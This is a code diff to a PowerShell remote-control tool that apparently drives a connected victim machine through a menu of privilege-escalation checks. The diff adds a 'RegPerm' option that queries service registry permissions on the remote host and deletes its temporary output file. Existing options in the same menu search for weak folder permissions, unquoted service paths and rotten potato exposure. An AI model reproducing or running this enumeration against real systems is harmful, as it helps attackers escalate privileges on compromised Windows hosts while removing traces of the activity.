@@ -456,6 +456,7 @@ While($Client.Connected)
         write-host "   -------   -----------                     -------";
         write-host "   Check     Retrieve Folder Privileges      Client:User  - Privileges Required";
         write-host "   WeakDir   Search weak privs recursive     Client:User  - Privileges Required";
+        write-host "   RegPerm   Services registry permissions   Client:User  - Privileges Required";
         write-host "   Service   Search Unquoted Service Paths   Client:User  - Privileges Required";
         write-host "   RottenP   Search For rotten potato vuln   Client:User  - Privileges Required";
         write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
@@ -482,6 +483,11 @@ While($Client.Connected)
           If(-not ($User_Attr) -or $User_Attr -eq " "){$User_Attr = "Everyone:"};
           $Command = "icacls `"$RfPath\*`" `> `$env:tmp\WeakDirs.txt;`$check_ACL = get-content `$env:tmp\WeakDirs.txt|findstr /C:`"$User_Attr`"|findstr /C:`"($Attrib)`";If(`$check_ACL){Get-Content `$env:tmp\WeakDirs.txt;remove-item `$env:tmp\WeakDirs.txt -Force}else{echo `"   [i] None Weak Folders Permissions Found [ $User_Attr($Attrib) ] ..`" `> `$env:tmp\Weak.txt;Get-Content `$env:tmp\Weak.txt;Remove-Item `$env:tmp\Weak.txt -Force;remove-item `$env:tmp\WeakDirs.txt -Force}";
        }
+        If($my_choise -eq "RegPerm" -or $my_choise -eq "Perm")
+        {
+          write-host " List Remote-Host Services registry permissions." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "get-acl HKLM:\System\CurrentControlSet\services\*|Select-Object PSChildName,Owner,AccessToString|format-list `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";
+        }
         If($my_choise -eq "Service" -or $my_choise -eq "service")
         {
           write-host " List Remote-Host Unquoted Service Paths." -ForegroundColor Blue -BackgroundColor White;
